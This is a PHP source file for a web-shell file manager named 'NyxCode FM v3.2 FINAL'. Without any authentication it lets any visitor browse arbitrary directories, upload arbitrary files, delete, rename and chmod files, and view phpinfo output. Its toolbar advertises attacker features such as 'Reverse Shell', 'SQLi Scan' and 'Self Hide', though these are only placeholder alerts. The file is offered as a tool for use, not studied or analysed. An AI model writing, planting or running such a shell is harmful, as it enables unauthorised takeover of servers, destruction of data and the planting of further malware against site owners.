<?php
// NyxCode FM v3.2 FINAL
session_start();

// Config
$path = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
chdir($path);
$files = scandir($path);

function perms($file) {
    $perms = fileperms($file);
    $info = ($perms & 0xC000) === 0xC000 ? 's' :
            (($perms & 0xA000) === 0xA000 ? 'l' :
            (($perms & 0x8000) === 0x8000 ? '-' :
            (($perms & 0x6000) === 0x6000 ? 'b' :
            (($perms & 0x4000) === 0x4000 ? 'd' :
            (($perms & 0x2000) === 0x2000 ? 'c' :
            (($perms & 0x1000) === 0x1000 ? 'p' : 'u'))))));

    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? 'x' : '-';
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? 'x' : '-';
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? 'x' : '-';
    return $info;
}

// Handle Rename
if (isset($_POST['rename'])) {
    rename($_POST['oldname'], $_POST['newname']);
}

// Handle Delete
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_dir($target)) {
        rmdir($target);
    } else {
        unlink($target);
    }
}

// Handle Chmod
if (isset($_POST['chmod'])) {
    chmod($_POST['file'], octdec($_POST['perm']));
}

// Handle Upload
if (isset($_POST['upload'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}

?><!DOCTYPE html><html><head>
<title>NyxCode FM v3.2 FINAL</title>
<style>
body { background: #000; color: aqua; font-family: monospace; }
table { width: 100%; border-collapse: collapse; }
th, td { padding: 8px; text-align: left; }
th { background: #111; }
tr:nth-child(even) { background: #111; }
button { padding: 5px; cursor: pointer; }
.action-btn { background: #222; color: aqua; border: none; padding: 5px 10px; margin: 2px; }
.toolbar { margin-bottom: 10px; }
.toolbar button { background: #0ff; border: none; padding: 8px; margin-right: 5px; color: #000; font-weight: bold; cursor: pointer; box-shadow: 2px 2px 5px aqua; }
.shadow-click { box-shadow: 0 0 10px aqua inset; }
</style>
</head>
<body>
<h2>NyxCode FM v3.2 FINAL</h2>
<div class="toolbar">
    <form method="POST" enctype="multipart/form-data" style="display:inline;">
        <input type="file" name="file">
        <button type="submit" name="upload">Upload</button>
    </form>
    <button onclick="alert('Mass Upload Coming Soon!')">Mass Upload</button>
    <button onclick="alert('Reverse Shell Coming Soon!')">Reverse Shell</button>
    <button onclick="alert('SQLi Scan Coming Soon!')">SQLi Scan</button>
    <button onclick="selfHide()">Self Hide</button>
    <button onclick="phpinfo()">PHP Info</button>
</div><table border="1">
<tr><th>File/Folder</th><th>Size</th><th>Permission</th><th>Action</th></tr>
<?php foreach ($files as $file) {
    if ($file == '.') continue;
    $isDir = is_dir($file);
    echo '<tr onclick="this.classList.toggle(\'shadow-click\')">';
    echo '<td>' . ($isDir ? '<b>' . $file . '</b>' : $file) . '</td>';
    echo '<td>' . ($isDir ? '--' : filesize($file)) . '</td>';
    echo '<td><form method="POST" style="display:inline;"><input type="hidden" name="file" value="' . $file . '"><input type="text" name="perm" value="' . perms($file) . '" size="10"><button type="submit" name="chmod">Chmod</button></form></td>';
    echo '<td>';
    echo '<form method="POST" style="display:inline;">
            <input type="hidden" name="oldname" value="' . $file . '">
            <input type="text" name="newname" value="' . $file . '" size="10">
            <button type="submit" name="rename">Rename</button></form> ';
    echo '<a href="?delete=' . urlencode($file) . '" onclick="return confirm(\'Delete?\')"><button class="action-btn">Delete</button></a>';
    echo '</td>';
    echo '</tr>';
} ?>
</table><script>
function selfHide() {
    alert('Self Hide Activated (Coming Soon Logic)');
}
function phpinfo() {
    window.open('?phpinfo=1', '_blank');
}
</script><?php if (isset($_GET['phpinfo'])) { phpinfo(); exit; } ?></body>
</html>
